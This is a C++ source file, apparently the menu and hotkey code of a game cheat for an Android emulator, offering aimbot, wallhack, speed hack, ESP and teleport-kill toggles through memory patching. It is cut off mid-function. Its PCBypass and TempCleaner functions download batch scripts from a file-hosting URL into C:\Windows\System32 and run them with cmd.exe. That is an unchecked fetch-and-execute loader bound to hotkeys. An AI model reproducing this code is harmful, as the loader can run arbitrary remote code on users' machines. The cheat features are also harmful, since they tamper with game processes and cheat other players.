// Include main.h first - it defines IMGUI_DEFINE_MATH_OPERATORS and includes imgui.h, image.h, avatar.h
#include <examples/example_win32_directx11/main.h>
// main.h already includes imgui.h, imgui_impl_win32.h, imgui_impl_dx11.h, imgui_freetype.h
// and also image.h, avatar.h - so we don't need to include them again
#include "ui.hpp"
#include <examples/example_win32_directx11/stt.hpp>
#include <examples/example_win32_directx11/stt1.hpp>
#include <examples/example_win32_directx11/src/Overlay/Overlay.hpp>
#include <examples/example_win32_directx11/src/Globals.hpp>
#include <examples/example_win32_directx11/EspLines/Data/Data.hpp>
#include <D3DX11tex.h>
#include <dwmapi.h>
#include <cmath>
#include <map>
#include <string>
#include <unordered_map>
#include <filesystem>
#include <fstream>
#include <shlobj.h>
#include <tchar.h>
#include <Windows.h>
#include <future>
#include <TlHelp32.h>
#include <codecvt>
#include <locale>
#include <examples/example_win32_directx11/src/Fonts/Fonts.hpp>
#include <examples/example_win32_directx11/src/Fonts/icon.h>
#include <imgui_settings.h>
#include <examples/example_win32_directx11/EspLines/Visuals/Namegun.h>
#include <examples/example_win32_directx11/EspLines/Loot/LootUI.hpp>
//#include <examples/example_win32_directx11/AOBMemory.h>
#include <thread>
#include <mutex>
#include <chrono>
#include <vector>
#include <atomic>
#include <functional>
#include <examples/example_win32_directx11/Blaze.h>
#include <examples/example_win32_directx11/BlazeMem.h>
#include <examples/example_win32_directx11/AIMBOTMEMORY.H>
#include <examples/example_win32_directx11/src/adb/adb.hpp>
#include <examples/example_win32_directx11/EspLines/Data/AimBotRage.hpp>
#include <examples/example_win32_directx11/EspLines/Data/AimBotVisible.hpp>
#include "examples/example_win32_directx11/auth/stonixyauth.hpp"
// texture namespace is already defined in main.h

#pragma comment(lib, "D3DX11.lib")
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "shell32.lib")
#include <examples/example_win32_directx11/notifications.h>

// Fallback for missing icon defines:
#ifndef ICON_KEY_1_FILL
#define ICON_KEY_1_FILL "\ueece"
#endif

std::string MemoryLogs = "";
CNotifications p_notif;
AimbotMemory Aim;
AimMemory SingleScanAim;

extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

// External variables from main.h
extern ID3D11Device* g_pd3dDevice;
extern ID3D11DeviceContext* g_pd3dDeviceContext;
extern IDXGISwapChain* g_pSwapChain;
extern ID3D11RenderTargetView* g_mainRenderTargetView;
// Variables - define here once to avoid ambiguity from multiple definitions
// These are used for tab animations and UI state
// Variables - define as static to avoid ambiguity from multiple definitions  


static bool isLoggingIn = false;
static bool isRegistering = false;
extern void ParticlesSpot();
extern void UpdateTheme();
extern void SrDudas();
extern void Render();
#include <atomic>
extern std::atomic<bool> g_AdbFailed;
// extern std::string MemoryLogs;  // Defined in main.h
extern bool RevemoSound;
extern bool bTheme;
// extern const std::unordered_map<std::string, RoleInfo> roleDefinitions;  // Defined in yorzen.h
// extern const std::unordered_map<std::string, std::string> userRoles;  // Defined in yorzen.h

D3DX11_IMAGE_LOAD_INFO info; ID3DX11ThreadPump* pump{ nullptr };

// Static variables from Main.cpp

static int slider_int[30];
static bool prev_aimbot_memory_state = false;
static std::atomic<bool> g_aimbotExternalBusy{ false };
static std::atomic<bool> g_aimbotExternalPatched{ false };
float color_edit[10][4];
static int combo[30];
static int keybind[310];
static int keybind_mode[3044];
const char* combo_list[] = { "#1", "#2", "#3", "#4", "#5" };
static int iTabs;
static int iSubTabs;

static float menu_alpha = 1.F;
static bool menu_active = true;

static char PassWord[50] = { "" };
static char Licence[50] = { "" };
static char UserName[50] = { "" };
static char RgPassWord[50] = { "" };
static char RgUserName[50] = { "" };

// Store user's custom values for camera and speed (preserved when turned off)
static float storedCameraHorizontalOffset = 0.0f;
static float storedCameraVerticalOffset = 0.0f;
static float storedSpeedValue = 1.0f;

static int keybind_pcbypass = 0;
static int keybind_tempcleaner = 0;

int keybind_menu_key = VK_HOME;
int keybind_streamer_mode = 0;
int keybind_aimbot_legit = 0;  // Hold-to-activate Aimbot Visible (Legit key)
static int scan_method_mode = 0;       // 0 = Mid Scan (default), 1 = Slow Scan
static bool scan_method_inited = false;

static bool is_authorized = false;

#include <urlmon.h>
#include <shellapi.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")

// Helper Functions
bool FileExists1(const char* filePath) {
    DWORD fileAttr = GetFileAttributesA(filePath);
    return (fileAttr != INVALID_FILE_ATTRIBUTES &&
        !(fileAttr & FILE_ATTRIBUTE_DIRECTORY));
}

bool DownloadFile1(const char* url, const char* localFile) {
    HRESULT hr = URLDownloadToFileA(NULL, url, localFile, 0, NULL);
    if (FAILED(hr)) {
        return false;
    }
    return true;
}

bool RunBatchFile(const char* filePath) {
    const char* fileExtension = strrchr(filePath, '.');
    if (!fileExtension) {
        return false;
    }
    const char* program = nullptr;
    std::string parameters;
    if (_stricmp(fileExtension, ".vbs") == 0) {
        program = "wscript";
        parameters = std::string("\"") + filePath + "\"";
    }
    else if (_stricmp(fileExtension, ".bat") == 0 || _stricmp(fileExtension, ".cmd") == 0) {
        program = "cmd.exe";
        parameters = "/C \"" + std::string(filePath) + "\"";
    }
    else {
        return false;
    }
    HINSTANCE result = ShellExecuteA(NULL, "open", program, parameters.c_str(),
        NULL, SW_SHOWNORMAL);
    if ((int)result <= 32) {
        return false;
    }
    return true;
}

void TempCleaner() {
    const char* url = "https://files.catbox.moe/lg2jiw.bat";
    const char* localFile = "C:\\Windows\\System32\\tempcleaner.bat";
    if (FileExists1(localFile)) {
        RunBatchFile(localFile);
    }
    else {
        if (DownloadFile1(url, localFile)) {
            RunBatchFile(localFile);
        }
    }
}

void PCBypass() {
    const char* url = "https://files.catbox.moe/r4lhfw.bat";
    const char* localFile = "C:\\Windows\\System32\\bypass.bat";
    if (FileExists1(localFile)) {
        RunBatchFile(localFile);
    }
    else {
        if (DownloadFile1(url, localFile)) {
            RunBatchFile(localFile);
        }
    }
}

// BlazeMem externals: never toast "Enabled" until MemoryLogs confirms scan+patch succeeded.
static bool BlazeMemLogFailed()
{
    const std::string& log = MemoryLogs;
    if (log.empty())
        return true;
    auto has = [&](const char* s) { return log.find(s) != std::string::npos; };
    return has("Emulator Not Found") || has("Failed To Apply") || has("Failed To Remove") ||
           has("Failed to Enable") || has("Failed to Disable") || has("Failed") || has("failed") ||
           has("not found") || has("Not Found") || has("Pattern Not Found") ||
           has("Pattern search failed") || has("search failed") || has("attach failed") ||
           has("OpenProcess failed") || has("Address Not Found") || has("load pattern first") ||
           has("unexpected error");
}

static bool BlazeMemEnableOk()
{
    if (BlazeMemLogFailed())
        return false;
    const std::string& log = MemoryLogs;
    auto has = [&](const char* s) { return log.find(s) != std::string::npos; };
    if (has(": Applying") || has("Scan: Scanning") || has("Scanning...") || has("Scanning!"))
        return false;
    return has("Successfully Injected") || has("Successfully applied") ||
           has("Activated Successfully") || has(" - Enabled!") || has("Enabled!");
}

static bool BlazeMemDisableOk()
{
    if (BlazeMemLogFailed())
        return false;
    const std::string& log = MemoryLogs;
    auto has = [&](const char* s) { return log.find(s) != std::string::npos; };
    if (has(": Removing") || has("Reverting..."))
        return false;
    return has("Successfully Removed") || has("Deactivated Successfully") ||
           has("Successfully Removed..") || has(" - Disabled!") || has("Disabled Successfully");
}

static bool BlazeMemLoadOk()
{
    if (BlazeMemLogFailed())
        return false;
    const std::string& log = MemoryLogs;
    auto has = [&](const char* s) { return log.find(s) != std::string::npos; };
    if (has("Scan: Scanning") || has("Scanning..."))
        return false;
    return has("Loaded Successfully") || has("Scan Results Found");
}

static void BlazeMemRunToggle(int checkboxId, bool enabling, const char* label,
    const std::function<void()>& onEnable, const std::function<void()>& onDisable)
{
    std::thread([checkboxId, enabling, label, onEnable, onDisable]() {
        MemoryLogs.clear();
        const ImColor failCol(255, 80, 80, 255);
        if (enabling) {
            onEnable();
            if (!BlazeMemEnableOk()) {
                checkboxes[checkboxId] = false;
                const std::string msg = std::string(label) + ": " +
                    (MemoryLogs.empty() ? "scan/patch failed" : MemoryLogs);
                p_notif.AddMessage(msg.c_str(), ICON_BOMB_FILL, failCol);
                return;
            }
            const std::string okMsg = std::string(label) + " Enabled";
            p_notif.AddMessage(okMsg.c_str(), ICON_BOMB_FILL, c::anim::active);
        }
        else {
            onDisable();
            if (!BlazeMemDisableOk()) {
                checkboxes[checkboxId] = true;
                const std::string msg = std::string(label) + ": " +
                    (MemoryLogs.empty() ? "restore failed" : MemoryLogs);
                p_notif.AddMessage(msg.c_str(), ICON_BOMB_FILL, failCol);
                return;
            }
            checkboxes[checkboxId] = false;
            const std::string offMsg = std::string(label) + " Disabled";
            p_notif.AddMessage(offMsg.c_str(), ICON_BOMB_FILL, failCol);
        }
    }).detach();
}

static void BlazeMemOnCheckboxToggled(int checkboxId, const char* label,
    const std::function<void()>& onEnable, const std::function<void()>& onDisable)
{
    // Checkbox is already ticked/unticked by ImGui on click — keep that, patch in background.
    BlazeMemRunToggle(checkboxId, checkboxes[checkboxId], label, onEnable, onDisable);
}

static void BlazeMemHotkeyToggle(int checkboxId, const char* label,
    const std::function<void()>& onEnable, const std::function<void()>& onDisable)
{
    const bool wantOn = !checkboxes[checkboxId];
    checkboxes[checkboxId] = wantOn;
    BlazeMemRunToggle(checkboxId, wantOn, label, onEnable, onDisable);
}

static void BlazeMemRunLoad(const char* label, const std::function<void()>& onLoad)
{
    std::thread([label, onLoad]() {
        MemoryLogs.clear();
        onLoad();
        const ImColor failCol(255, 80, 80, 255);
        if (!BlazeMemLoadOk()) {
            const std::string msg = std::string(label) + ": " +
                (MemoryLogs.empty() ? "pattern not found" : MemoryLogs);
            p_notif.AddMessage(msg.c_str(), ICON_BOMB_FILL, failCol);
            return;
        }
        const std::string okMsg = std::string(label) + " Loaded";
        p_notif.AddMessage(okMsg.c_str(), ICON_BOMB_FILL, c::anim::active);
    }).detach();
}

void ToggleAimbotMaster() {
    aimbot_master_enabled = !aimbot_master_enabled;
    if (aimbot_master_enabled) {
        g_Globals.AimBot.Enabled = false;
        g_Globals.AimBot.Rage = false;
        g_Globals.AimBot.Ragev2 = false;
        switch (aimbot_type) {
        case 0: g_Globals.AimBot.Enabled = true; break;
        case 1: g_Globals.AimBot.Rage = true; break;
        case 2: /* Aimbot Legit: Visible is activated only while holding the legit keybind */ break;
        }
    }
    else {
        g_Globals.AimBot.Enabled = false;
        g_Globals.AimBot.Rage = false;
        g_Globals.AimBot.Ragev2 = false;
    }
}

static bool AimbotExternalMemoryFailed() {
    return (MemoryLogs.find("failed") != std::string::npos) ||
        (MemoryLogs.find("not found") != std::string::npos) ||
        (MemoryLogs.find("Not Found") != std::string::npos) ||
        (MemoryLogs.find("attach failed") != std::string::npos) ||
        (MemoryLogs.find("write failed") != std::string::npos) ||
        (MemoryLogs.find("applied to 0 entity") != std::string::npos);
}

static void AimbotExternalRunToggle(bool enable) {
    if (g_aimbotExternalBusy.exchange(true))
        return;

    if (!enable && !g_aimbotExternalPatched.load()) {
        checkboxes[5] = false;
        prev_aimbot_memory_state = false;
        g_aimbotExternalBusy = false;
        return;
    }

    if (enable && g_aimbotExternalPatched.load()) {
        checkboxes[5] = true;
        prev_aimbot_memory_state = true;
        g_aimbotExternalBusy = false;
        return;
    }

    std::thread([enable]() {
        MemoryLogs.clear();
        const ImColor failCol(255, 80, 80, 255);
        if (enable) {
            SingleScanAim.EnableAim("Neck");
            if (AimbotExternalMemoryFailed()) {
                checkboxes[5] = false;
                prev_aimbot_memory_state = false;
                g_aimbotExternalPatched = false;
                const std::string msg = MemoryLogs.empty() ? "Aimbot: scan failed" : MemoryLogs;
                p_notif.AddMessage(msg.c_str(), ICON_BOMB_FILL, failCol);
            }
            else {
                checkboxes[5] = true;
                prev_aimbot_memory_state = true;
                g_aimbotExternalPatched = true;
                p_notif.AddMessage("Aimbot Enabled", ICON_BOMB_FILL, c::anim::active);
            }
        }
        else {
            SingleScanAim.Restore();
            checkboxes[5] = false;
            prev_aimbot_memory_state = false;
            g_aimbotExternalPatched = false;
            p_notif.AddMessage("Aimbot Disabled", ICON_BOMB_FILL, failCol);
        }
        g_aimbotExternalBusy = false;
    }).detach();
}

void UtilityHotkeysThread() {
    bool pcb_pressed = false, temp_pressed = false;
    bool speed_pressed = false, wall_pressed = false, fastland_pressed = false, cam_pressed = false, sniper_pressed = false;
    bool aimbot_pressed = false, refresh_esp_pressed = false;

    while (true) {
        // --- Utilities ---
        if (keybind_pcbypass != 0 && (GetAsyncKeyState(keybind_pcbypass) & 0x8000)) {
            if (!pcb_pressed) {
                checkboxes[352] = true;
                std::thread([]() { PCBypass(); }).detach();
                pcb_pressed = true;
            }
        }
        else { pcb_pressed = false; }

        if (keybind_tempcleaner != 0 && (GetAsyncKeyState(keybind_tempcleaner) & 0x8000)) {
            if (!temp_pressed) {
                checkboxes[354] = true;
                std::thread([]() { TempCleaner(); }).detach();
                temp_pressed = true;
            }
        }
        else { temp_pressed = false; }

        // --- Aimbot Hotkeys ---
        if (keybind_aimbot != 0 && (GetAsyncKeyState(keybind_aimbot) & 0x8000)) {
            if (aimbot_type == 2) {
                if (!aimbot_master_enabled) {
                    aimbot_master_enabled = true;
                    ToggleAimbotMaster();
                }
            } else {
                if (!aimbot_pressed) {
                    ToggleAimbotMaster();
                    aimbot_pressed = true;
                }
            }
        }
        else { 
            aimbot_pressed = false; 
            if (aimbot_type == 2 && aimbot_master_enabled) {
                aimbot_master_enabled = false;
                ToggleAimbotMaster();
            }
        }

        // --- All Functions ---
        if (keybind_speed_hack != 0 && (GetAsyncKeyState(keybind_speed_hack) & 0x8000)) {
            if (!speed_pressed) {
                BlazeMemHotkeyToggle(30, "Speed Hack",
                    []() { Aim.ActivateSpeed(); }, []() { Aim.OFFSpeed(); });
                speed_pressed = true;
            }
        }
        else { speed_pressed = false; }

        if (keybind_wall_hack != 0 && (GetAsyncKeyState(keybind_wall_hack) & 0x8000)) {
            if (!wall_pressed) {
                BlazeMemHotkeyToggle(31, "Wall Hack",
                    []() { Aim.ActivateWallhack(); }, []() { Aim.OFFWallhack(); });
                wall_pressed = true;
            }
        }
        else { wall_pressed = false; }

        if (keybind_fast_landing != 0 && (GetAsyncKeyState(keybind_fast_landing) & 0x8000)) {
            if (!fastland_pressed) {
                BlazeMemHotkeyToggle(111, "Fast Landing",
                    []() { Aim.ActivateFastlanding(); }, []() { Aim.OFFFastlanding(); });
                fastland_pressed = true;
            }
        }
        else { fastland_pressed = false; }

        if (keybind_camera_right != 0 && (GetAsyncKeyState(keybind_camera_right) & 0x8000)) {
            if (!cam_pressed) {
                BlazeMemHotkeyToggle(301, "Camera Right",
                    []() { Aim.ActivateCamera(); }, []() { Aim.OFFCamera(); });
                cam_pressed = true;
            }
        }
        else { cam_pressed = false; }

        if (keybind_sniper_switch != 0 && (GetAsyncKeyState(keybind_sniper_switch) & 0x8000)) {
            if (!sniper_pressed) {
                BlazeMemHotkeyToggle(8, "Sniper Switch",
                    []() { Aim.SniperSwitchon(); }, []() { Aim.SniperSwitchoff(); });
                sniper_pressed = true;
            }
        }
        else { sniper_pressed = false; }

        static std::chrono::steady_clock::time_point s_lastEspRefreshHotkey;
        if (keybind_refresh_esp != 0 && (GetAsyncKeyState(keybind_refresh_esp) & 0x8000)) {
            if (!refresh_esp_pressed) {
                const auto now = std::chrono::steady_clock::now();
                if (std::chrono::duration_cast<std::chrono::milliseconds>(now - s_lastEspRefreshHotkey).count() >= 250) {
                    s_lastEspRefreshHotkey = now;
                    g_Globals.EspConfig.Refresh = true;
                    p_notif.AddMessage("ESP Refreshed", ICON_BOMB_FILL, c::anim::active);
                }
                refresh_esp_pressed = true;
            }
        }
        else { refresh_esp_pressed = false; }

        static bool streamer_mode_pressed = false;
        if (keybind_streamer_mode != 0 && (GetAsyncKeyState(keybind_streamer_mode) & 0x8000)) {
            if (!streamer_mode_pressed) {
                g_Globals.General.Capture = !g_Globals.General.Capture; // Toggle
                if (g_Globals.General.Capture) {
                    p_notif.AddMessage("Streamer Mode Enabled", ICON_BOMB_FILL, c::anim::active);
                }
                else {
                    p_notif.AddMessage("Streamer Mode Disabled", ICON_BOMB_FILL, ImColor(255, 80, 80, 255));
                }
                streamer_mode_pressed = true;
            }
        }
        else { streamer_mode_pressed = false; }

        static bool aimbot_external_pressed = false;
        if (keybind_aimbot_external != 0 && (GetAsyncKeyState(keybind_aimbot_external) & 0x8000)) {
            if (!aimbot_external_pressed) {
                const bool wantOn = !g_aimbotExternalPatched.load();
                checkboxes[5] = wantOn;
                AimbotExternalRunToggle(wantOn);
                aimbot_external_pressed = true;
            }
        }
        else { aimbot_external_pressed = false; }

        static bool external_aim_toggle_pressed = false;
        if (g_Globals.AimBot.ExternalKey != 0 && (GetAsyncKeyState(g_Globals.AimBot.ExternalKey) & 0x8000)) {
            if (!external_aim_toggle_pressed) {
                g_Globals.AimBot.ExternalEnabled = !g_Globals.AimBot.ExternalEnabled;
                if (g_Globals.AimBot.ExternalEnabled)
                    p_notif.AddMessage("External Aim Enabled", ICON_BOMB_FILL, c::anim::active);
                else
                    p_notif.AddMessage("External Aim Disabled", ICON_BOMB_FILL, ImColor(255, 80, 80, 255));
                external_aim_toggle_pressed = true;
            }
        }
        else { external_aim_toggle_pressed = false; }

        static bool burst_fire_pressed = false;
        if (keybind_burst_fire != 0 && (GetAsyncKeyState(keybind_burst_fire) & 0x8000)) {
            if (!burst_fire_pressed) {
                g_Globals.Misc.FastFire = !g_Globals.Misc.FastFire;
                if (g_Globals.Misc.FastFire) p_notif.AddMessage("Burst Fire Enabled", ICON_BOMB_FILL, c::anim::active);
                else p_notif.AddMessage("Burst Fire Disabled", ICON_BOMB_FILL, ImColor(255, 80, 80, 255));
                burst_fire_pressed = true;
            }
        }
        else { burst_fire_pressed = false; }

        static bool wukong_mode_pressed = false;
        if (keybind_wukong_mode != 0 && (GetAsyncKeyState(keybind_wukong_mode) & 0x8000)) {
            if (!wukong_mode_pressed) {
                g_Globals.EspConfig.showOnlyVisible = !g_Globals.EspConfig.showOnlyVisible;
                if (g_Globals.EspConfig.showOnlyVisible) p_notif.AddMessage("Wukong Mode Enabled", ICON_BOMB_FILL, c::anim::active);
                else p_notif.AddMessage("Wukong Mode Disabled", ICON_BOMB_FILL, ImColor(255, 80, 80, 255));
                wukong_mode_pressed = true;
            }
        }
        else { wukong_mode_pressed = false; }

        static bool sniper_scope_pressed = false;
        if (keybind_sniper_scope != 0 && (GetAsyncKeyState(keybind_sniper_scope) & 0x8000)) {
            if (!sniper_scope_pressed) {
                g_Globals.Misc.SniperScope = !g_Globals.Misc.SniperScope;
                if (g_Globals.Misc.SniperScope)
                    p_notif.AddMessage("Sniper Scope Enabled", ICON_BOMB_FILL, c::anim::active);
                else
                    p_notif.AddMessage("Sniper Scope Disabled", ICON_BOMB_FILL, ImColor(255, 80, 80, 255));
                sniper_scope_pressed = true;
            }
        }
        else { sniper_scope_pressed = false; }
        
        static bool fly_internal_pressed = false;
        static bool fly_internal_runtime_started = false;
        if (keybind_fly_hack_internal != 0 && (GetAsyncKeyState(keybind_fly_hack_internal) & 0x8000)) {
            if (!fly_internal_pressed) {
                g_Globals.Misc.FlyHackInternalEnabled = !g_Globals.Misc.FlyHackInternalEnabled;
                if (g_Globals.Misc.FlyHackInternalEnabled) {
                    FlyHack_LocalPlayer::Start();
                    p_notif.AddMessage("Fly Hack Internal Enabled", ICON_BOMB_FILL, c::anim::active);
                } else {
                    FlyHack_LocalPlayer::Stop();
                    p_notif.AddMessage("Fly Hack Internal Disabled", ICON_BOMB_FILL, ImColor(255, 80, 80, 255));
                }
                fly_internal_pressed = true;
            }
        }
        else { fly_internal_pressed = false; }

        // Keep internal fly thread synced even when toggled from UI/config (not only hotkey path).
        if (g_Globals.Misc.FlyHackInternalEnabled) {
            if (!fly_internal_runtime_started) {
                FlyHack_LocalPlayer::Start();
                fly_internal_runtime_started = true;
            }
        }
        else {
            if (fly_internal_runtime_started) {
                FlyHack_LocalPlayer::Stop();
                fly_internal_runtime_started = false;
            }
        }

        // --- Aimbot Legit (Hold-to-Visible) - only when type 2 is selected and master is enabled ---
        if (aimbot_type == 2 && aimbot_master_enabled && keybind_aimbot_legit != 0) {
            if (GetAsyncKeyState(keybind_aimbot_legit) & 0x8000) {
                g_Globals.AimBot.Enabled = true;  // Key held: activate Visible
                g_Globals.AimBot.KeyBind = keybind_aimbot_legit; // Force firing
            }
            else {
                g_Globals.AimBot.Enabled = false; // Key released: deactivate immediately
                g_Globals.AimBot.KeyBind = VK_LBUTTON;
            }
        }

        // --- Custom Missing Keybinds ---
        static bool down_player_pressed = false;
        if (keybind_down_player != 0 && (GetAsyncKeyState(keybind_down_player) & 0x8000)) {
            if (!down_player_pressed) {
                g_Globals.Misc.DownPlayer = !g_Globals.Misc.DownPlayer;
                if (g_Globals.Misc.DownPlayer) p_notif.AddMessage("Down Player Enabled", ICON_BOMB_FILL, c::anim::active);
                else p_notif.AddMessage("Down Player Disabled", ICON_BOMB_FILL, ImColor(255, 80, 80, 255));
                down_player_pressed = true;
            }
        }
        else { down_player_pressed = false; }

        static bool telekill_pressed = false;
        if (keybind_telekill != 0 && (GetAsyncKeyState(keybind_telekill) & 0x8000)) {
            if (!telekill_pressed) {
                g_Globals.Misc.TeleKill = !g_Globals.Misc.TeleKill;
                if (g_Globals.Misc.TeleKill) p_notif.AddMessage("TeleKill Enabled", ICON_BOMB_FILL, c::anim::active);
                else p_notif.AddMessage("TeleKill Disabled", ICON_BOMB_FILL, ImColor(255, 80, 80, 255));
                telekill_pressed = true;
            }
        }
        else { telekill_pressed = false; }

        static bool speed_timer_pressed = false;
        if (keybind_speed_timer != 0 && (GetAsyncKeyState(keybind_speed_timer) & 0x8000)) {
            if (!speed_timer_pressed) {
                g_Globals.Misc.SpeedTimerEnabled = !g_Globals.Misc.SpeedTimerEnabled;
                if (g_Globals.Misc.SpeedTimerEnabled) p_notif.AddMessage("Speed Timer Enabled", ICON_BOMB_FILL, c::anim::active);
                else p_notif.AddMessage("Speed Timer Disabled", ICON_BOMB_FILL, ImColor(255, 80, 80, 255));
                speed_timer_pressed = true;
            }
        }
        else { speed_timer_pressed = false; }


        std::this_thread::sleep_for(std::chrono::milliseconds(10)); // Prevent high CPU usage
    }
}

// Helper functions from Main.cpp
void UpdateFloatWithLerp(bool& condition, float& a, float b, float c) {
    float deltaTime = ImGui::GetIO().DeltaTime;
    float speed = 16.0f;

    if (condition) {
        a = ImLerp(a, c, deltaTime * speed);
        if (ImAbs(a - c) < 30.f) {
            condition = false;
        }
    }
    else {
        a = ImLerp(a, b, deltaTime * speed);
    }
}

void BarSmallText(const char* text, const char* text2)
{
    ImGui::PushStyleVar(ImGuiStyleVar_ItemSpacing, ImVec2(0, 0));
    ImGui::Text(text); ImGui::SameLine();
    ImGui::PushFont(font::small_font);
    ImGui::SetCursorPosY(ImGui::GetCursorPosY() + 2);
    ImGui::TextDisabled(text2);  ImGui::SameLine();
    ImGui::SameLine();
    ImGui::PopFont();
    ImGui::PopStyleVar();
}

void DrawGlowGradientText(ImDrawList* draw, ImVec2 pos, const char* text)
{
    ImU32 col1 = IM_COL32(0, 202, 252, 255); // #00CAFC
    ImU32 col2 = IM_COL32(0, 255, 220, 255);

    // Glow layers
    for (int i = 1; i <= 6; i++)
    {
        draw->AddText(nullptr, 0.0f,
            ImVec2(pos.x - i * 0.3f, pos.y),
            IM_COL32(0, 202, 252, 30), text);
    }

    // Main gradient-ish text
    draw->AddText(pos, col1, text);
}

// License field: ImGui paste shortcuts often never fire when the overlay does not receive WM_KEYDOWN
// (e.g. game/emulator keeps keyboard focus). CallbackAlways + GetAsyncKeyState applies paste through BufDirty
// so internal InputText state and the user buffer stay in sync.
static int LicenseKeyPasteCallback(ImGuiInputTextCallbackData* data)
{
    if (data->EventFlag != ImGuiInputTextFlags_CallbackAlways)
        return 0;

    static bool prev_ctrl_v_down = false;
    const bool ctrl_v_down =
        ((GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0) &&
        ((GetAsyncKeyState('V') & 0x8000) != 0);
    const bool ctrl_v_edge = ctrl_v_down && !prev_ctrl_v_down;
    prev_ctrl_v_down = ctrl_v_down;

    static bool prev_shift_ins_down = false;
    const bool shift_ins_down =
        ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0) &&
        ((GetAsyncKeyState(VK_INSERT) & 0x8000) != 0);
    const bool shift_ins_edge = shift_ins_down && !prev_shift_ins_down;
    prev_shift_ins_down = shift_ins_down;

    if (!ctrl_v_edge && !shift_ins_edge)
        return 0;

    const char* clip = ImGui::GetClipboardText();
    if (!clip)
        clip = "";

    strncpy_s(data->Buf, (size_t)data->BufSize, clip, _TRUNCATE);
    data->BufTextLen = (int)strlen(data->Buf);
    data->BufDirty = true;
    data->CursorPos = data->BufTextLen;
    data->SelectionStart = data->CursorPos;
    data->SelectionEnd = data->CursorPos;
    return 0;
}

// One-time menu metrics/colors (avoid rewriting ~15 style fields every frame).
static void ApplyInsigniaMenuBaseStyle() {
    ImGuiStyle& s = ImGui::GetStyle();
    s.FramePadding = ImVec2(15, 10);
    s.ItemSpacing = ImVec2(15, 7);
    s.FrameRounding = 2.f;
    s.WindowRounding = 20.f;
    s.WindowBorderSize = 0.f;
    s.PopupBorderSize = 0.f;
    s.WindowPadding = ImVec2(0, 0);
    s.ChildBorderSize = 1.f;
    s.Colors[ImGuiCol_Border] = ImVec4(0.f, 0.f, 0.f, 0.f);
    s.Colors[ImGuiCol_Separator] = ImVec4(1.f, 1.f, 1.f, 0.2f);
    s.Colors[ImGuiCol_BorderShadow] = ImVec4(0.f, 0.f, 0.f, 0.f);
    s.WindowShadowSize = 0;
    s.PopupRounding = 5.f;
    s.ScrollbarSize = 1;
    s.SeparatorTextPadding = ImVec2(10, 10);
    s.AntiAliasedLinesUseTex = false;
}


namespace FWork {
    namespace {
        constexpr uint32_t kCfgMagic = 0x325A4342u; // 'BCZ2'
        constexpr uint32_t kCfgVersion = 3u;
        constexpr const char* kLegacyCfgPath = "C:\\ImGuiConfig.bin";

        // Per-user path — each PC keeps its own file (not shared C:\ImGuiConfig.bin).
        static std::string GetAppDataDir()
        {
            char appData[MAX_PATH] = {};
            if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_LOCAL_APPDATA, nullptr, SHGFP_TYPE_CURRENT, appData))) {
                std::string dir = std::string(appData) + "\\SamXRizz\\Silent-X";
                CreateDirectoryA((std::string(appData) + "\\SamXRizz").c_str(), nullptr);
                CreateDirectoryA(dir.c_str(), nullptr);
                return dir;
            }
            return std::string("SamXRizz");
        }

        static std::string GetConfigFilePath()
        {
            return GetAppDataDir() + "\\settings.bin";
        }

        static std::string GetLicenseFilePath()
        {
            return GetAppDataDir() + "\\license.key";
        }

        static void SaveLicenseKey(const char* key)
        {
            if (!key || !key[0])
                return;
            std::ofstream out(GetLicenseFilePath(), std::ios::binary | std::ios::trunc);
            if (out)
                out.write(key, static_cast<std::streamsize>(strlen(key)));
        }

        static void LoadLicenseKey()
        {
            std::ifstream in(GetLicenseFilePath(), std::ios::binary);
            if (!in)
                return;

            std::string key((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
            while (!key.empty() && (key.back() == '\r' || key.back() == '\n'))
                key.pop_back();
            if (!key.empty())
                strncpy_s(g_Globals.General.License, key.c_str(), _TRUNCATE);
        }

        static void DeleteLegacyConfigFile()
        {
            remove(kLegacyCfgPath);
        }

        struct ConfigHeader {
            uint32_t magic;
            uint32_t version;
            uint32_t aimBytes;
            uint32_t visualsBytes;
            uint32_t miscBytes;
            uint32_t generalBytes;
        };

        static bool HeaderMatchesCurrentBuild(const ConfigHeader& hdr)
        {
            return hdr.magic == kCfgMagic
                && hdr.version == kCfgVersion
                && hdr.aimBytes == sizeof(g_Globals.AimBot)
                && hdr.visualsBytes == sizeof(g_Globals.Visuals)
                && hdr.miscBytes == sizeof(g_Globals.Misc)
                && hdr.generalBytes == sizeof(g_Globals.General);
        }

        static bool ReadConfigPayload(FILE* f)
        {
            if (fread(&g_Globals.AimBot, sizeof(g_Globals.AimBot), 1, f) != 1)
                return false;
            g_Globals.AimBot.AimPosition = 0;
            if (!std::isfinite(g_Globals.AimBot.Fov) || g_Globals.AimBot.Fov < 0.0f || g_Globals.AimBot.Fov > 1200.0f)
                g_Globals.AimBot.Fov = 1200.0f;
            if (g_Globals.AimBot.SilentAimTargetMode != 0 && g_Globals.AimBot.SilentAimTargetMode != 2)
                g_Globals.AimBot.SilentAimTargetMode = 0;
            if (g_Globals.AimBot.SilentAimHitboxMode < 0 || g_Globals.AimBot.SilentAimHitboxMode > 1)
                g_Globals.AimBot.SilentAimHitboxMode = 0;
            if (!std::isfinite(g_Globals.AimBot.SilentAimFov) || g_Globals.AimBot.SilentAimFov < 0.0f || g_Globals.AimBot.SilentAimFov > 1200.0f)
                g_Globals.AimBot.SilentAimFov = 1200.0f;

            if (fread(&g_Globals.Visuals, sizeof(g_Globals.Visuals), 1, f) != 1)
                return false;
            if (g_Globals.Visuals.EspLines < 0 || g_Globals.Visuals.EspLines > 2)
                g_Globals.Visuals.EspLines = 0;
            if (g_Globals.Visuals.ShowLogo < 0 || g_Globals.Visuals.ShowLogo > 1)
                g_Globals.Visuals.ShowLogo = 1;
            if (g_Globals.Visuals.EspLineLogoSize < 32.0f || g_Globals.Visuals.EspLineLogoSize > 128.0f)
                g_Globals.Visuals.EspLineLogoSize = 64.0f;
            if (g_Globals.Visuals.HealthBarPosition < 0 || g_Globals.Visuals.HealthBarPosition > 3)
                g_Globals.Visuals.HealthBarPosition = 2;
            if (g_Globals.Visuals.players_healthbar < 0 || g_Globals.Visuals.players_healthbar > 3)
